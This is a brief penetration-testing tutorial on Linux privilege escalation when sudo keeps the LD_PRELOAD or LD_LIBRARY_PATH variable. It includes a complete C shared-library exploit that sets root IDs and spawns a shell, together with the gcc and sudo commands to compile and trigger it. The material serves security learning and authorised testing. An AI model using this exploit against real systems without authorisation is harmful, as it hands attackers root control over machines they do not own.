# Sudo Privilege Escalation by Overriding Shared Library

`LD_PRELOAD` and `LD_LIBRARY_PATH` might be vulnerable to privilege escalation (PrivEsc).

### LD\_PRELOAD, LD\_LIBRARY\_PATH Overwriting <a href="#ld_preload-ld_library_path-overwriting" id="ld_preload-ld_library_path-overwriting"></a>

#### Investigation <a href="#investigation" id="investigation"></a>

Check sudo commands.

```shellscript
sudo -l
```

The below is the output example.

```shellscript
env_keep+=LD_PRELOAD

(ALL : ALL) NOPASSWD: somecmd
```

If we find the sudo command keeps **LD\_PRELOAD** environment, we can overwrite this variable to load our custome shared object and escalate the privileges.

Also, we can replace the **LD\_PRELOAD** with **LD\_LIBRARY\_PATH**.

By the way, to list shared libraries required by the executable, use `ldd` command.

```
ldd somecmd
```

#### Exploitation <a href="#exploitation" id="exploitation"></a>

First off, create **exploit.c** under **/tmp** .

```shellscript
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void inject()__attribute__((constructor));

void inject() {
    unsetenv("LD_PRELOAD");
    setuid(0);
    setgid(0);
    system("/bin/bash");
}
```

* The **"constructor"** attribute is a special type of function attribute in GCC. It tells the compiler to automatically call the function before the main function.

Now compile the c program to shared object.

```shellscript
# -fPIC: Generate Position Independent Code.
# -shared: Generate a shared library.
# -o: Output shared object.
gcc  -fPIC -shared -o exploit.so exploit.c
```

We can execute command with setting the shared library to **LD\_PRELOAD** variable then spawn the root shell.

```
sudo LD_PRELOAD=/tmp/exploit.so somecmd
```
